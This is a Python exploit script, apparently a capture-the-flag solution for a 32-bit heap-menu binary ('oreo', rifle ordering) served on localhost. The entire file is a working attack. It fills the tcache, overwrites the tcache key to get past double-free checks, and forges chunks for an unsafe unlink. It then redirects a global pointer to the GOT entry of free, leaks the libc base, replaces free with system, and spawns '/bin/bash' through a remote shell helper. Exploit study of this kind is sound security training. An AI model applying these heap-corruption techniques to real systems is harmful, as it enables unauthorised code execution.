import socket
import sys
from time import sleep as sleep_
from struct import pack, unpack

from utils import remote_shell, _is_int
from logger import Logger

def sleep(s):

    print(f"sleeping for {s} s")
    sleep_(s)
    print(f"done sleeping {s} s")

# due to the fact that the IO is buffered
# and the binary is 32bit, the best way to "unbuffer" output
# was to blindly send empty inputs and the binary would write "Action:" to output
# and then, after the buffer is full, it would spit it all out back to this script
def flush_():
    for _ in range(500):
        sock.send(b"\n")
    sleep(RECV_DELAY)

to_bytes = to_bytes = lambda x: pack("I", x)

def from_bytes(x):

    while(len(x) < 4):
        x += b'\x00'

    return unpack("I", x)[0]

logger = Logger("OREO")

SERVER_ADDR = ('localhost', 8889)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(SERVER_ADDR)

RECV_DELAY = 0.1

ALLOC = b'1\n'
SHOW_ALL = b'2\n'
FREE_ALL = b'3\n'
FILL_MESSAGE = b'4\n'
SHOW_STATS = b'5\n'
EXIT = b'6\n'

def allocate_request(name, desc):

    if type(name) == str:
        name = name.encode()

    if type(desc) == str:
        desc = desc.encode()

    name += b'\n'
    desc += b'\n'

    sleep(RECV_DELAY)

    #sock.recv(1024)
    sock.send(name)

    sleep(RECV_DELAY)

    #sock.recv(1024)
    sock.send(desc)

    sleep(RECV_DELAY)
    #sock.recv(1024)

    return None

def show_all_request():

    sleep(RECV_DELAY)
    flush_()

    recvd = sock.recv(1024* 32).split(b"===================================")[1:-1]
      
    all_rifles = []
    for rifle in recvd:
        
        desc_off = rifle.find(b"Description: ")
        all_rifles.append((rifle[7: desc_off - 1], rifle[desc_off + 13: -1]))

    return all_rifles

def free_all_request():

    sleep(RECV_DELAY)

    #sock.recv(1024)
    return None

def fill_message_request(message):

    if type(message) == str:
        message = message.encode()

    message += b'\n'

    sleep(RECV_DELAY)
   
    #sock.recv(1024)
    sock.send(message)

    return None

def show_stats_request():

    sleep(RECV_DELAY)
    flush_()

    recvd = sock.recv(1024 * 32).split(b" times\n")
    
    new_int = _is_int(recvd[0][recvd[0].find(b"New:    ") + 8:])
    order_int = _is_int(recvd[1][recvd[1].find(b"Orders: ") + 8:])
    order_msg = None

    if recvd[2].find(b"Message: ") > -1:
        order_msg = recvd[2][recvd[2].find(b"Message: ") + 9: recvd[2].find(b"====") - 1]

    return new_int, order_int, order_msg

def command(opt):

    sock.send(opt[0])

    if opt[0] is ALLOC:
        logger.log_info(f"adding rifle")
        return allocate_request(*opt[1:])

    elif opt[0] is SHOW_ALL:
        logger.log_info(f"showing all rifles")
        return show_all_request(*opt[1:])

    elif opt[0] is FREE_ALL:
        logger.log_info(f"ordering all added rifles")
        return free_all_request(*opt[1:])

    elif opt[0] is FILL_MESSAGE:
        logger.log_info(f"replacing order message")
        return fill_message_request(*opt[1:])

    elif opt[0] is SHOW_STATS:
        logger.log_info("showing stats")
        return show_stats_request(*opt[1:])

def command_stream():

    # no PIE, no RELRO
    # canary everywhere, nx, aslr

    GLOBAL_MESSAGE_BUFFER_PTR_ADDR = 0x0804a2a8
    GLOBAL_MESSAGE_BUFFER_ADDR = 0x0804a2c0

    GOT_FREE_ADDR = 0x0804a238
    
    FREE_OFFSET = 0x87420
    SYSTEM_OFFSET = 0x45830
    FGETS_OFFSET = 0x6fe10

    sleep(1)

    #flush_()
    #sock.recv(1024 * 32)

    # preparing the terrain for an unsafe unlinking, 
    # using chunks (mostly) artificially placed in the global message buffer (order message buffer)

    # filling the TCACHE for size 0x60
    # this is going to be the size of a chunk we forge and free at some point
    # and we want it to consolidate with the previous chunk, not to be put inside tcache

    logger.log_info("----filling TCACHE for size 0x60")

    command((FILL_MESSAGE, b"\x41" * 0x18 + 
                            b'\x00' * 4 + 
                            to_bytes(0x60 + 0x1) + 
                            b'\x00' * 0x38))
    for _ in range(7):
        
        command((ALLOC, b"\x42" * 0x1b + to_bytes(GLOBAL_MESSAGE_BUFFER_ADDR + 0x20), "CCCC"))
        command((FREE_ALL,))

        sleep(RECV_DELAY)

        # override tcache_entry->key 
        # to bypass double free detection in the next for loop
        command((FILL_MESSAGE, b"\x41" * 0x18 + 
                                b'\x00' * 4 + 
                                to_bytes(0x60 + 0x1) + 
                                b'\x00' * 4 + 
                                to_bytes(0xdeadbeef)))

    logger.log_success("----TCACHE filled for size 0x60")
    logger.log_info("----forging chunks for unsafe unlinking")

    # filling with 1s the a couple of bytes after the end of the global buffer
    # (forging a chunk at the end of global buffer and obtaining it back)
    
    command((FILL_MESSAGE, b'\x41' * 0x78 + 
                            b'\x00' * 4 + 
                            to_bytes(0x40 + 0x1)))

    command((ALLOC, b'\x42' * 0x1b + to_bytes(GLOBAL_MESSAGE_BUFFER_ADDR + 0x80), "DDDD"))

    command((FREE_ALL,))
    command((ALLOC, b'E', b'\xff' * 0x18))

    # forging all the necessary chunks in the global buffer
    
    command((FILL_MESSAGE, b'\x00' * 4 + 
                            to_bytes(0x18 + 0x1) + 
                            to_bytes(GLOBAL_MESSAGE_BUFFER_PTR_ADDR - 0xc) + 
                            to_bytes(GLOBAL_MESSAGE_BUFFER_PTR_ADDR - 0x8) + 
                            b'\x00' * 4 * 2 + 
                            to_bytes(0x18) + 
                            to_bytes(0x60) + 
                            b'\x00' * 4 * 22 + 
                            to_bytes(0x60) + 
                            to_bytes(0x10 + 0x1)))

    logger.log_success("----chunks forged")
    logger.log_info("----unlinking")

    # free-ing the forged chunk with size 0x60 from the global buffer

    command((ALLOC, b'\x42' * 0x1b + to_bytes(GLOBAL_MESSAGE_BUFFER_ADDR + 0x20), 'FFFF'))
    command((FREE_ALL,))

    logger.log_success("----unlinked")
    logger.log_info("----leaking libc base, overwriting .got.plt[free]")

    # global message buffer ptr points to &itself - 0xc
    # redirect global message buffer ptr to .got.plt[free]
    command((FILL_MESSAGE, b'\xee' * 0xc + to_bytes(GOT_FREE_ADDR)))

    _, _, leaked_got_addrs = command((SHOW_STATS,))
    print(leaked_got_addrs[:4])
    free_addr = from_bytes(leaked_got_addrs[:4])

    libc_base_addr = free_addr - FREE_OFFSET
    logger.log_success(f"----libc base leaked: {hex(libc_base_addr)}")

    command((ALLOC, 'FFFF', "/bin/bash"))

    command((FILL_MESSAGE, to_bytes(libc_base_addr + SYSTEM_OFFSET) + 
                            to_bytes(libc_base_addr + FGETS_OFFSET)))   # restoring old value
                                                                        # to not break IO
    
    command((FREE_ALL,))

    remote_shell(sock)

if __name__ == "__main__":
    command_stream()